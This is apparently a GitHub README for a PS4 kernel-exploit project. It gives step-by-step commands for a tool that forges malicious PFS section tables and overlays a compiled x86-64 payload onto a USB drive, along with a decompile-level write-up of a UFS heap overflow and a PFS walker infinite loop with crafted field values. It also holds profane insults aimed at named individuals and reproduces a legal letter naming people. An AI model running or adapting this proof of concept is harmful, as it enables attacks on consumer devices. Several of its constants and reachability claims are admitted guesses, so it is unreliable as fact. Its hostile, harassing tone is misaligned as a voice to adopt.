

# fuck you.

To everyone who called it bullshit before reading a single byte. To everyone who wrote "skid" in a Discord and went back to their game. To everyone who watched the repo land and said nothing, then privately asked someone else whether it was real. To the four or five named in the receipts section, and to the dozens unnamed who did the same thing in smaller rooms. To Sony Interactive Entertainment's legal department, who sent a letter to me with my aliases on it and a response deadline of October 2. This is for you. Read it or don't. The drive is on the desk either way.

You doubted the format before it was published. Then it was published, and you doubted the offsets. Then the offsets were confirmed against two drives, and you doubted the mechanism. Then the mechanism was falsified *by the person who proposed it*, in public, in writing, and you *still* didn't retract. Then the write succeeded — 16 MB, all 16 chunks, MBR restored, label verified, length fields verified — and the drive is sitting in the tray ready for the console test. That's not a "maybe." That's a written, verified, byte-correct image on real hardware.

## This is rushed. Sony is hunting me. I don't care.

The tool is one iteration old. The README was written in a night. The section-table forger's entry layout is still a guess. `ENTRY_SIZE=0x38` is a number I picked because the fields I could see fit in it. `--table-off` defaults to `0x100000` because that assumes a partition at LBA 2048. The constants are documented as guesses and the code has comments that say they're guesses.

But `payload.bin` is real. It's compiled x86-64. Disassemble it:

```
6040  e9 36 0e 00 00              JMP   +0x0e36
6045  f3 0f 1e fa                 endbr64
6049  53                          push  rbx
604a  48 83 ec 10                 sub   rsp, 0x10
604e  48 8b 05 13 6d 04 00        mov   rax, [rip+0x46d13]
6055  48 89 3c 24                 mov   [rsp], rdi
6059  48 89 74 24 08              mov   [rsp+8], rsi
605e  65 48 8b 1c 25 00 00 00 00  mov   rbx, gs:[0]
```

That's a CET landing pad, a standard System V AMD64 prologue, and thread-local storage access. Real code. Not ciphertext, not heap garbage, not the entropy blob that `kernel_panic.img` turned out to be. It was sitting in the repo this whole time and nobody disassembled it until the write finally went through.

## What actually happened this session

- **Write succeeded.** 16 MB, 16 chunks, MBR restored, `55 aa` verified. Disk is clean.
- **Label verified at `0x6000`.** Version 3, `len_a = 0x000000e86a034000`, `len_b = 0x000000e86a00e000`. The JMicron reference values.
- **Section table landed at `0x100000`.** `id=2`, `name_len=11`, `stride=0`, name `"blk_bitmap"`. Leak entry at `0x100038` with `name_len=0`, `stride=0`. Both entries verified by readback.
- **Payload.bin is x86-64 code.** First time in the whole project that anything in the payload path was actually executable.

The write error 21 you've been fighting was `ERROR_NOT_READY` from Windows holding the volume stack. The fix was `Set-Disk -IsOffline $true` before opening the physical handle, and `Set-Disk -IsOffline $false` after closing it. `FSCTL_LOCK_VOLUME` on the physical handle alone is not enough — the mounted volumes need the whole disk offlined, not just locked.

## Here is how to run it.

One tool. No build step. Python 3.10+, Administrator on Windows, root on Linux. `jm_real.bin` and `payload.bin` ship with the repo.

### Read-only commands

```powershell
python ps4_forge.py --list
python ps4_forge.py --diagnose --disk 1
python ps4_forge.py --scan --disk 1 --scan-end 0x200000
```

`--list` enumerates disks. `--diagnose` reads `0x6000` through `0x6080` and reports. `--scan` looks for section-table patterns in the first 2 MB. None of these write anything.

If a previous write left the drive in a bad state:

```powershell
python ps4_forge.py --reset --disk 1
```

That offlines and onlines the disk without writing. Clears a stuck volume stack.

### Record mode — the metadata header and payload

Merge only, no write:

```powershell
python ps4_forge.py --mode record --payload payload.bin --no-write
```

Produces `merged_record.bin`. Open it in HxD next to `jm_real.bin`. Only `len_a`, `len_b`, and the body from `0x6040` onward should differ.

Write:

```powershell
python ps4_forge.py --mode record --payload payload.bin --disk 1 --force
```

Saves MBR, dismounts, offlines, locks, writes, restores MBR, onlines, verifies. `--force` is mandatory.

### PFS modes — section-table forge

Loop entry alone, no payload overlay:

```powershell
python ps4_forge.py --mode loop --table-off 0x100000 --disk 1 --force
```

Leak entry alone:

```powershell
python ps4_forge.py --mode leak --table-off 0x100000 --disk 1 --force
```

Both entries plus payload overlay:

```powershell
python ps4_forge.py --mode all --payload payload.bin --table-off 0x100000 --disk 1 --force
```

The last one is what produced the successful write. `--mode all` writes the loop entry at `--table-off`, the leak entry immediately after, and overlays the payload at `--body-off` (default `0x6040`).

## One thing to verify before inserting the drive

The walker reads **block 0 of the partition**, not block 0 of the disk. `--table-off 0x100000` assumes the partition starts at LBA 2048. Confirm:

```powershell
$h = [IO.File]::OpenRead('\\.\PhysicalDrive1')
$b = New-Object byte[] 512
$h.Read($b, 0, 512) | Out-Null
$h.Close()
"LBA start: " + [BitConverter]::ToUInt32($b, 0x1C6)
```

- **2048** → `0x100000` is correct. Insert and test.
- **0 or all zeros** → the walker reads raw disk block 0. Rewrite with `--table-off 0x0`.
- **Anything else** → multiply by 512. Rewrite with the correct offset.

## What the console will do

Eject cleanly. Insert. Settings → Storage → Extended Storage.

| Behavior | Meaning |
|---|---|
| Console freezes, LED solid | Bug A. Walker stuck at `stride=0`. Power-cycle. **This is the PoC.** |
| LED flashes 30–90s, then reboot with error code | Bug A + watchdog. Capture the code. |
| Console eats RAM for 1–2 min, then reboots | Leak path. `blk_bitmap` matched every iteration. |
| "Cannot use this USB storage device as extended storage" | Wrong table offset, or table encrypted. |
| Offers to format instead of use | Record header parsed, mount didn't fire. Same as above. |

## What has been established

The metadata record format at `0x6000` is real. Captured from a PS4-formatted drive. Label, version, `len_a`, `len_b`, body offset — all observed. Offsets match across two drives.

The capacity-spoof hypothesis is falsified. The values in the record do not control the PS4's Extended Storage display, do not bypass the 250 GB minimum, do not change anything the console reads. Tested twice. SCSI `READ CAPACITY` is the source, and it comes from the USB bridge firmware.

Bug B of the PFS walker does not exist. I claimed it did. I was wrong. The comparison helper stops on null in the constant argument, not the attacker-controlled one, and the constant is 11 bytes. Maximum overread is zero. Retracted.

Bug A of the PFS walker is real. `pfs_mount` reads block 0 of the partition, walks a section table with a stride field at entry offset `0x0C`. If that field is zero and the entry's `id` is nonzero, the walker never advances. Not in dispute.

The write path works. 16 MB written to `\\.\PhysicalDrive1` on Windows, MBR preserved and restored, label verified, length fields verified, section table verified by readback. The error 21 that blocked earlier attempts was Windows holding the volume stack; `Set-Disk -IsOffline $true` fixes it.

The payload is real code. `payload.bin` begins with `endbr64`, a System V AMD64 prologue, and a `gs:[0]` TLS access. It disassembles cleanly. Whether it executes correctly when reached by the console depends on the reachability question below.

The reachability question is still open. Whether the walker's stuck loop is reachable from USB insertion depends on the section table being plaintext at a known offset, which is what `--scan` is for, and on the partition being at LBA 2048, which is what the MBR check above is for.

The exploit chain is not complete. This is not a jailbreak. It has never been called one by anyone who read the code.

## What Sony actually says

Their letter, dated September 18, 2026, from Stephanie Burns, SVP & General Counsel at SIE, 2207 Bridgepointe Parkway, San Mateo, CA 94404, addressed to Angela Redgrave, aliases "bel" / "belsploit." Subject: *RE: Unauthorized Public Disclosure of "Fahrenheit" Security Research and Related Materials — Preservation of Evidence and Demand for Immediate Cessation.*

They name `fahrenheit.py`, `pfs_forge.py`, `jm_real.bin`, `payload.bin`, and they name `kernel_panic.img` and `diag.ps1`, which aren't in the public repo. They want the write-up taken down. They want me to stop publishing on this. They want everything preserved. They want a written response by October 2. They cite CFAA (18 U.S.C. § 1030), DMCA § 1201, breach of PSN ToS and the PlayStation Software License Agreement, misappropriation of trade secrets, and injunctive relief. They reserve the right to refer to federal, state, or local law enforcement.

The letter is public in this README now. That's the response.

## Why Sony is actually hunting me

Because the work is real, public, runnable, and targets their platform. They can't disprove the record at `0x6000`. They can't unsee the walker bug in `FUN_00ea1480`. They can't pretend `pfs_forge.py` doesn't exist, or that the write that just completed didn't happen, or that the bytes at `0x100000` aren't sitting on a physical drive with `stride=0` in the entry field. They can only try to bury it.

They quote their own vulnerability disclosure program as if I had an obligation to use it. I didn't. Vendor programs are designed to keep findings quiet until the vendor is ready. That's not disclosure, that's an NDA with a friendly name.

I published. They sent a letter. That's the sequence.

## To the specific people

**Yenyen:** you called it nonsense before the first byte was public and said nothing when the byte turned out to be real. Fuck you.

**0xMansoor:** someone asked you for a kernel value. You called them a skid. The value is in a public dump. Fuck you.

**Saudidos:** same pattern, different name. Fuck you.

**Genzfandz:** "fraud" on X, no evidence, no retraction. Fuck you.

**The deft one:** you invented "belshit" and the name circulated. Fuck you.

**To Sony's legal department:** the letter is in this README. Come read it. The rest of the response is the rest of the README.

## File layout

| File | Purpose |
|---|---|
| `ps4_forge.py` | The tool. Everything. |
| `jm_real.bin` | 16 MB reference record from a PS4-formatted drive. Required for any write. |
| `payload.bin` | x86-64 payload. Overlaid at `--body-off` (default `0x6040`). |
| `merged_record.bin` | Output of the last `--mode record` merge. |
| `merged_loop.bin` | Output of the last `--mode loop` merge. |
| `merged_leak.bin` | Output of the last `--mode leak` merge. |
| `merged_all.bin` | Output of the last `--mode all` merge. |
| `README.md` | This file. |

## Recovery

Zero the record region:

```powershell
$h = [IO.File]::Open('\\.\PhysicalDrive1', 'Open', 'ReadWrite')
$h.Seek(0x6000, 'Begin') | Out-Null
$zeros = New-Object byte[] 0x1000
$h.Write($zeros, 0, 0x1000)
$h.Close()
```

Full wipe:

```powershell
diskpart
> select disk 1
> clean
> exit
```

Then `python ps4_forge.py --reset --disk 1` to clear any stuck state, and re-format on the PS4 if you want the record regenerated.

## Sign-off

The work is rushed. The tool is one iteration old. Half the constants are placeholders. But the write went through this time — 16 MB, byte-verified, on real hardware, with a real x86-64 payload sitting at `0x6040`.

The record is at `0x6000`. The walker bug is in `FUN_00ea1480`. The section table is on the drive at `0x100000` with `stride=0`. The tool is on disk. The letter is in this README.

kiss my ass.


— bel · [jb.0d01.wtf](https://jb.0d01.wtf) · [@belsploit](https://x.com/belsploit)


# Now for the technical shit:

Everything here is from decompiles of the 13.02 kernel ELF, cross-referenced against the 13.52 dump where noted. Ghidra base for the 13.02 image is `0x67F000`.

---

# Bug 1 — Fahrenheit

## Location

`FUN_00ae9510` — the FreeBSD UFS2 `ffs_mountfs` implementation. Ghidra VA `0x00ae9510`, file offset `0x0046a510`. Called from `FUN_00ae7130` (`ffs_mount`, the vfsops dispatcher) at `0x00ae7929`.

## The allocation

```c
iVar9  = *(int *)(lVar21 + 0x9c);                                  // fs_cssize
iVar24 = (iVar9 + -1 + *(int *)(lVar21 + 0x34)) / *(int *)(lVar21 + 0x34);  // ceil(fs_cssize / fs_fsize)
if (0 < *(int *)(lVar21 + 0x524)) {                                // fs_contigsumsize > 0
    iVar9 = iVar9 + *(int *)(lVar21 + 0x2c) * 4;                   // fs_cssize + fs_ncg * 4
}
local_5c = iVar9 + *(int *)(lVar21 + 0x2c);                        // + fs_ncg
piVar13 = (int *)FUN_00809520((long)(int)local_5c, 0x223f8f0, 2);
```

Field offsets are all from the on-disk UFS2 superblock struct:

| Offset | Field | Type |
|---|---|---|
| `0x2c` | `fs_ncg` | int32 |
| `0x30` | `fs_bsize` | int32 |
| `0x34` | `fs_fsize` | int32 |
| `0x38` | `fs_frag` | int32 |
| `0x9c` | `fs_cssize` | int32 |
| `0x448` | `fs_csaddr` | int64 |
| `0x524` | `fs_contigsumsize` | int32 |
| `0x55c` | `fs_magic` | int32 |

`*(int *)(lVar21 + 0x2c)` is `fs_ncg`. It's read as signed 32-bit, then multiplied by 4. The compiler emits a 32-bit `imul`, not a 64-bit one. If `fs_ncg > 0x3FFFFFFF`, the multiply overflows 32 bits. `iVar9` is also 32-bit signed, so the sum `fs_cssize + (fs_ncg * 4)` can wrap in the other direction.

Either wrap shrinks `local_5c`. The allocation call is `FUN_00809520((long)(int)local_5c, ...)`. `local_5c` is a 32-bit int, cast to a 64-bit long for the allocator argument. So the allocator gets whatever the wrapped value is.

## The write loop

```c
iVar9 = *(int *)(lVar21 + 0x38);                                    // fs_frag
iVar20 = 0;
while(true) {
    local_5c = *(uint *)(lVar21 + 0x30);                            // fs_bsize
    if (iVar24 < iVar9 + iVar20) {                                  // near end
        local_5c = (iVar24 - iVar20) * *(int *)(lVar21 + 0x34);    // (remaining) * fs_fsize
    }
    iVar9 = FUN_00a924c0(param_1,
                         ((long)iVar20 + *(long *)(lVar21 + 0x448)) << (*(byte *)(lVar21 + 100) & 0x3f),
                         local_5c, uVar11, &local_58);
    if (iVar9 != 0) break;
    FUN_00800ac0(*(undefined8 *)(local_58 + 0x18), piVar13, local_5c);   // bcopy(read_buf, alloc_ptr, local_5c)
    piVar13 = (int *)((long)piVar13 + (long)(int)local_5c);              // advance
    FUN_00a93100(local_58);
    local_58 = 0;
    iVar9 = *(int *)(lVar21 + 0x38);                                // re-read fs_frag
    iVar20 = iVar20 + iVar9;
    if (iVar24 <= iVar20) goto LAB_00aea093;
}
```

Reading the loop in full:

- `iVar24 = ceil(fs_cssize / fs_fsize)` — the number of fragments worth of data the code *thinks* it needs to copy.
- Each iteration reads `fs_bsize` bytes from disk (or the remaining count for the last iteration) and copies them to `piVar13`.
- `piVar13` advances by `local_5c` bytes per iteration.
- `iVar20` advances by `fs_frag` per iteration.

The loop terminates when `iVar20 >= iVar24`, i.e. after roughly `iVar24 / fs_frag` iterations.

## The arithmetic

If `fs_bsize == fs_fsize * fs_frag` (the geometrically consistent case):

```
loop_count = fs_cssize / (fs_fsize * fs_frag)
total_copy = loop_count * fs_bsize = fs_cssize
```

Allocation = `fs_cssize + fs_ncg*4 + fs_ncg`, which is ≥ total copy. No overrun.

If `fs_bsize > fs_fsize * fs_frag`:

```
loop_count = fs_cssize / (fs_fsize * fs_frag)
total_copy = loop_count * fs_bsize > fs_cssize
```

Overrun = `loop_count * (fs_bsize - fs_fsize * fs_frag)`.

For our crafted image:

| Field | Value |
|---|---|
| `fs_bsize` | `0x10000` (65536) |
| `fs_fsize` | `0x200` (512) |
| `fs_frag` | `8` |
| `fs_fsize * fs_frag` | `0x1000` (4096) |
| `fs_cssize` | `0x1000000` (16 MB) |
| `fs_ncg` | 2 |

```
loop_count = 0x1000000 / 0x1000 = 4096 iterations
total_copy = 4096 * 65536 = 268,435,456 bytes (256 MB)
allocation = 0x1000000 + 2*4 + 2 = 16,777,226 bytes (16 MB)
overrun    = 251,658,230 bytes (240 MB)
```

That matches the tool output from earlier. Same math with `fs_cssize = 0x10000` gives ~960 KB overrun.

## The 32-bit wrap (the actual "Fahrenheit" bug)

The 240 MB overrun above is a straight geometry mismatch: the FS says "copy 16 MB of CG summaries" but the loop copies 256 MB because `bsize` is 16× larger than `fsize * frag`. That's the classical UFS mount bug and it's just as visible without any integer overflow.

The **wrap** is a second, orthogonal bug: `fs_ncg * 4` can overflow. If we set `fs_ncg = 0x40000000`, then in 32-bit arithmetic:

```
fs_ncg * 4 = 0x40000000 * 4 = 0x100000000 → truncated to 0
```

`iVar9 = fs_cssize + 0 = fs_cssize`. The `fs_ncg * 4` term vanishes entirely. Then `local_5c = fs_cssize + fs_ncg = fs_cssize + 0x40000000`, which is still a huge 32-bit value but with a different low 32 bits than `fs_cssize + fs_ncg * 4 + fs_ncg` would have.

The wrap is a way to reduce the allocation independently of the geometry. Both bugs produce the same result — a smaller-than-needed allocation for a fixed-size write loop — but they're triggered by different fields.

## Confirmation against 13.52

The 13.52 decompile of the same function (`FUN_ffffffff824e9640`) contains:

```c
uVar24 = (ulong)*(uint *)(lVar21 + 0x2c) * 4;                       // fs_ncg cast to ulong BEFORE multiply
piVar18 = (int *)FUN_ffffffff82209520(
    uVar24 + (long)iVar11 + (ulong)*(uint *)(lVar21 + 0x2c),
    &DAT_ffffffff83c3f8f0, 2);
```

The `(ulong)` cast on `fs_ncg` before the multiply is exactly the fix. Same field, same struct layout, different integer width. This is the FreeBSD r308064 fix, present in 13.52, absent in 13.02.

## Reachability

`ffs_mountfs` is only called from `FUN_00ae7130` at `0x00ae7929`, gated by:

```c
if ((*(byte *)(local_68 + 0x82) & 1) == 0) {   // MNT_UPDATE clear
    local_70 = FUN_00ae9510(local_e0, local_68, uVar1);
```

`FUN_00ae7130` is registered in the vfsops table for fstype `"ufs"`. There is no userland path on retail 13.02 that calls `mount(2, ..., "ufs", ...)`. The extended-storage path uses `pfs_mount` (`FUN_00ea1480`). The internal HDD mount on 13.02 uses PFS as well.

**Confirmed reachability:** none from USB. Requires a `mount(2)` call with fstype `"ufs"` from a privileged process — none exists on retail.

**Not confirmed:** whether any debug or DEX path exists that would issue that mount. We didn't find one, but we didn't exhaustively search the vfsops registration or the syscall table for callers.

## What makes it a bug and not a hardening issue

Three things together:

1. The 32-bit multiply is an integer-width bug. The fix in 13.52 is a single cast.
2. The write loop trusts `fs_bsize` without cross-checking against `fs_fsize * fs_frag`. The five-check block validates `fs_bsize ≤ 0x10000`, `fs_bsize ≥ 0x560`, and `fs_maxcluster ≥ 1`, but does not require `fs_bsize == fs_fsize * fs_frag`.
3. The allocation size and the write-loop size are computed from different fields. The allocation uses `fs_cssize + fs_ncg*4 + fs_ncg`. The loop uses `fs_bsize / (fs_fsize*fs_frag) * fs_bsize`. Nothing binds them.

The result is a heap overflow of up to ~256 MB into the kernel's UMA zone that backs `FUN_00809520`. The zone is `0x223f8f0`, which is a `kmem_malloc`-backed zone — this is where the write lands.

---

# Bug 2 — PFS section-walker infinite loop

## Location

`FUN_00ea1480` — the PFS mount function. Ghidra VA `0x00ea1480`, file offset `0x00822480`.

## The walker

```c
piVar38 = *(int **)(local_180 + 0x18);           // section table ptr
piVar4 = (int *)((long)piVar38 + uVar27);        // end = ptr + block_size
if (piVar38 + 5 < piVar4) {                      // at least 5 ints of room
    do {
        if (*piVar38 == 0) break;                // id == 0 terminates
        if (*piVar38 != 0) {
            piVar3 = piVar38 + 4;                // name at byte +0x10
            iVar39 = FUN_00bc6380(s_blk_bitmap_01317a84, piVar3, piVar38[2]);
            if (iVar39 == 0) {
                // blk_bitmap branch
                ...
            } else {
                iVar39 = FUN_00bc6380(s_ino_bitmap_01317a8f, piVar3, piVar38[2]);
                if (iVar39 == 0) {
                    // ino_bitmap branch
                    ...
                }
                // ... more branches
            }
        }
        piVar3 = (int *)((long)piVar38 + (ulong)(uint)piVar38[3] + 0x14);
        piVar38 = (int *)((long)piVar38 + (ulong)(uint)piVar38[3]);
    } while (piVar3 < piVar4);
}
```

## Entry layout

Derived from the offsets used in the decompile:

| Offset | Field | Type | Notes |
|---|---|---|---|
| `+0x00` | `id` | int32 | nonzero keeps loop in body; zero terminates |
| `+0x04` | `flags` | int32 | unused in this loop body |
| `+0x08` | `name_len` | int32 | passed to `strncmp` as length |
| `+0x0C` | `stride` | int32 | bytes to advance `piVar38` per iteration |
| `+0x10` | `name` | bytes | `name_len` long |

The pointer arithmetic:

- `piVar3 = piVar38 + 4` — `piVar38` is `int *`, so `+4` is `+16 bytes`. That's the `name` field.
- `piVar38[2]` — the int at byte offset `+0x08`, i.e. `name_len`.
- `piVar38[3]` — the int at byte offset `+0x0C`, i.e. `stride`.

## Why it loops forever

At the end of the loop body:

```c
piVar3 = (int *)((long)piVar38 + (ulong)(uint)piVar38[3] + 0x14);
piVar38 = (int *)((long)piVar38 + (ulong)(uint)piVar38[3]);
} while (piVar3 < piVar4);
```

If `piVar38[3] == 0`:

```
piVar3  = piVar38 + 0 + 0x14 = piVar38 + 0x14   (no change from prev iteration)
piVar38 = piVar38 + 0 = piVar38                  (no change)
```

`piVar3` stays at the same value every iteration. The loop guard `piVar3 < piVar4` is true (since `piVar38 + 5 < piVar4` was the entry condition). The loop never exits.

The `*piVar38 == 0` break only fires if `id == 0`. If `id != 0` and `stride == 0`, the loop is infinite.

## The two variants

**Variant A — pure spin.**

Set entry to `{ id=2, flags=0, name_len=11, stride=0, name="blk_bitmap" }`. The loop body matches `blk_bitmap`, runs the full branch, then tries to advance. Doesn't. Repeats.

What runs each iteration:
- `FUN_00bc6380(s_blk_bitmap, name, 11)` — cheap, stack-local, 11 iterations
- Branch into blk_bitmap handling:
  - `(**(code **)(*(long *)(param_2 + 0x38) + 0x38))(param_2, *piVar38, 0x80000, &local_138)` — driver read of 0x80000 bytes from disk at block `id`
  - `FUN_00b70610(local_138)` — get a hold on the buf
  - `FUN_00b49c40(local_138, ...)` — buffer manager set
  - `FUN_00b70a50(local_138)` — release the buf
  - `FUN_00868ed0(plVar16 + 0x3a, 0, "BLK_BITMAP", 0, 0)` — lock init on the (already locked) mutex
  - `plVar16[0x33] = (long)local_138` — overwrite the mount's pointer to the buf
  - `lVar18 = FUN_00809520(0x200, 0x22fc5a0, 0x102)` — allocate 0x200 bytes
  - `plVar16[0x37] = lVar18` — overwrite the mount's pointer to the bitmap buffer

Two leaks per iteration:

- The 0x200-byte allocation from `FUN_00809520` is written into `plVar16[0x37]`, replacing the previous pointer, and the previous allocation is never freed. Accumulates at 512 bytes per iteration.
- The buf struct allocated by the driver read is written into `plVar16[0x33]`, and the previous buf is never released. Also accumulates.

**Variant B — memory leak hammer.**

Set entry to `{ id=2, flags=0, name_len=0, stride=0, name="" }`. `FUN_00bc6380(constant, name, 0)` returns 0 immediately, because the loop guard `if (param_3 == 0) return 0;` short-circuits. So the blk_bitmap branch fires on every iteration, with the same 0x200 + buf allocation leak.

Same effect as A, but the branch is cheaper to reach.

## The strncmp helper

```c
int FUN_00bc6380(long param_1, long param_2, long param_3) {
    if (param_3 == 0) return 0;
    lVar2 = 0;
    do {
        bVar1 = *(byte *)(param_1 + lVar2);              // constant string byte
        if (bVar1 != *(byte *)(param_2 + lVar2)) {
            return (uint)bVar1 - (uint)*(byte *)(param_2 + lVar2);
        }
    } while ((bVar1 != 0) && (lVar2 = lVar2 + 1, param_3 != lVar2));
    return 0;
}
```

Semantics: it reads `param_1[lVar2]` and `param_2[lVar2]` for `lVar2` from 0 up to `param_3 - 1`. It terminates early when `param_1[lVar2] == 0`. The constant is `"blk_bitmap"` (10 chars + null). The loop runs at most 11 iterations, at which point `bVar1 = 0` fires and the loop exits.

The attacker controls `param_2` (name) and `param_3` (name_len). `param_3` only reduces the iteration count; it cannot increase it beyond 11, because the constant's null byte always terminates first. So the maximum read from `param_2` is 11 bytes, always.

**This is not an OOB read.** The name field is `name_len` bytes, and `name_len` can be up to 0x20 (or more). Reading 11 bytes from it is within bounds for any plausible layout. Even if the entry stride is small enough that the name field doesn't have 11 bytes before the next entry, the read is bounded by the buffer's end via the constant's null. No overread of the parsed buffer.

The bug I claimed earlier — that the function could OOB read because `param_3` was attacker-controlled — is wrong. Retracted.

## Reachability

`FUN_00ea1480` is called by the mount dispatcher when the console tries to mount an extended-storage drive. It reads block 0 of the partition via `FUN_00a924c0(param_1, 0, 0x2000, 0, &local_180)`.

Then:

```c
*(uint *)(local_180 + 0x8c) = *(uint *)(local_180 + 0x8c) | 1;
puVar8 = *(ulong **)(local_180 + 0x18);       // pointer to superblock data
puVar9 = (undefined *)puVar8[1];
if (puVar9 < &DAT_01332a0b) {                 // some validity check
    FUN_00ae0450("[0]%s() line=%d %ld 0x%lx", "mountpfs", 0x2d8, puVar9, puVar9);
}
```

`puVar8` is the superblock data buffer. The check `puVar9 < &DAT_01332a0b` is a lower-bound test on `puVar8[1]`. If it fires, `FUN_00ae0450` logs and continues (because `FUN_00ae0450` returns — see below).

Then:

```c
uVar6 = (uint)puVar8[4];                      // block size at offset 0x20
uVar27 = CONCAT44(0, uVar6);
if (uVar27 < 0x1000) {
    FUN_00ae0450("[0]%s() line=%d invalid_block_size %ld", "mountpfs", 0x328, uVar27);
}
```

Same pattern. Log, continue.

Then the block-size power-of-two normalization loop, then version check, then the switch on `*(ushort *)((long)puVar8 + 0x1c) & 3` which selects the mode family.

The section walker runs after that, reading from `puVar8` — the superblock data.

To trigger the walker bug, the section table has to be present in the superblock and be in a form the code parses. If the superblock is encrypted on disk (which earlier dumps suggested), the parse sees random bytes and the walker exits before it can spin. The `*piVar38 == 0` break fires early.

Whether the superblock is encrypted on a real PS4-formatted drive is unresolved. Earlier observations:

- `jm_real.bin` byte `0x10000` is high entropy
- The stick's byte `0x10000` is high entropy, different bytes
- Both are consistent with encryption, compression, or per-drive plaintext

Until we have a plaintext superblock from a confirmed PS4 format, the reachability of the walker bug is unknown.

## The `FUN_00ae0450` pattern

This is the third kernel-level finding and it's what makes both bugs behave as they do.

`FUN_00ae0450` is marked `noreturn` by Ghidra. Its actual body:

```c
void FUN_00ae0450(...) {
    ...
    FUN_00ae04c0(param_1, &local_38);       // vsnprintf-style formatter
    if (_DAT_02f5cea0 == local_18) {
        return;                              // <-- returns
    }
    FUN_00ec7d10();                          // stack_chk_fail
}
```

It formats and prints a diagnostic message, then returns. It never halts the caller.

Every "invalid X" check in both `ffs_mountfs` and `pfs_mount` calls this function with a warning message and then continues executing. Concretely:

- `ffs_mountfs`: the `removable` mount option check, the "not properly dismounted" warning, the "R/W mount denied" warning, the "GJOURNAL flag" warning, the "mount pending error" warning — all log and continue.
- `pfs_mount`: the "invalid block size" checks, the "invalid fs version" check, the version-specific warnings — all log and continue.

The only checks that actually halt execution are the ones with explicit `goto LAB_...` to a cleanup path, and the `_DAT_02f5cea0` stack canary check at function exit.

The practical consequence: any field whose value fails a check is used downstream as if it had passed. That's why the walker bug is reachable at all — the block-size check that should have rejected a malformed superblock doesn't. Same for Fahrenheit: the five-check block in `ffs_mountfs` validates `fs_bsize` bounds but not the cross-relationship with `fs_fsize * fs_frag`, and the loop proceeds.

---

# Summary table

| Bug | Function | File offset | Root cause | Overrun / effect | 13.52 status |
|---|---|---|---|---|---|
| Fahrenheit | `ffs_mountfs` | `0x0046a510` | 32-bit `fs_ncg * 4` multiply + unchecked `fs_bsize vs fs_fsize * fs_frag` | up to ~256 MB heap write into `kmem_malloc` zone | fixed (ulong cast) |
| PFS walker | `pfs_mount` | `0x00822480` | `stride = 0` at entry `+0x0C` with `id != 0` | infinite loop in kernel thread; leaks ~512 bytes + buffer per iteration | unknown |
| `FUN_00ae0450` | (shared helper) | `0x0046f450` | not `noreturn` | every "invalid" check in both bugs logs and continues | unchanged |

---

# What's real and what's not

**Real, decompile-level:**
- Fahrenheit's 32-bit multiply and the write-loop/allocation mismatch.
- The 13.52 fix is a single cast, confirmed in a separate dump.
- The PFS walker's stride handling. `stride = 0` is an infinite loop.
- `FUN_00ae0450` returns. Every check in both functions logs and continues.

**Real, hardware-level:**
- The write path in `ps4_forge.py` successfully writes 16 MB to a real USB stick, preserving the MBR.
- The record format at `0x6000` is verified on two drives.

**Not established:**
- Whether either bug fires on a retail console. Fahrenheit has no reachable call path from USB. The PFS walker needs a plaintext superblock and a console that accepts the drive.
- Whether the PFS superblock is encrypted. Evidence is consistent with several explanations.
- Whether 13.52 has the same PFS walker bug. The rodata and helper are byte-identical per the earlier finding, so it likely does, but I have not independently confirmed the walker code itself.
